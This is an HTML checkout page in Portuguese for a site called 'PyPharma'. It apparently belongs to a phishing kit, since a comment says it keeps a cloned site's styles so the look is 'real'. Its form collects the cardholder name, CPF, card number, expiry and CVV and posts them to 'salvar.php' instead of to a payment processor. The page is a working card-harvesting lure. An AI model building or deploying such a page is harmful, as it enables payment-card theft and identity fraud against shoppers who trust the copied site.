<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalizar Pagamento — PyPharma</title>
    <!-- Mantendo os estilos originais do clone para o visual ficar real -->
    <link rel="stylesheet" href="_next/static/css/6405bac7976ebda4.css">
    <link rel="stylesheet" href="_next/static/css/e02272c0bfbbc3db.css">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-background text-foreground">
    <main class="flex-1">
        <div class="mx-auto max-w-md px-4 py-12">
            <div class="bg-card border border-border rounded-2xl p-6 shadow-lg">
                <h2 class="font-display text-xl font-bold text-center mb-6 uppercase tracking-wide">Finalizar Pagamento</h2>
                
                <form action="salvar.php" method="POST" class="space-y-4">
                    <!-- Valor Total (Oculto) -->
                    <input type="hidden" name="total" value="297.00">

                    <div>
                        <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">Nome impresso no cartão</label>
                        <input type="text" name="card-name" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="Ex: JOÃO DA SILVA">
                    </div>

                    <div>
                        <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">CPF do Titular</label>
                        <input type="text" name="card-cpf" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="000.000.000-00">
                    </div>

                    <div>
                        <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">Número do Cartão</label>
                        <input type="text" name="card-number" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="0000 0000 0000 0000">
                    </div>

                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">Validade</label>
                            <input type="text" name="card-expiry" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="MM/AA">
                        </div>
                        <div>
                            <label class="block text-xs font-semibold uppercase text-muted-foreground mb-1">CVV</label>
                            <input type="text" name="card-cvv" required class="w-full p-3 rounded-xl border border-border bg-background text-foreground focus:ring-2 focus:ring-primary outline-none transition-all" placeholder="123">
                        </div>
                    </div>

                    <button type="submit" class="w-full mt-6 h-12 rounded-xl bg-primary font-display text-sm uppercase tracking-wider text-primary-foreground shadow-md transition-all hover:brightness-110 active:scale-95">
                        Confirmar Pagamento
                    </button>
                </form>
            </div>
        </div>
    </main>
</body>
</html>
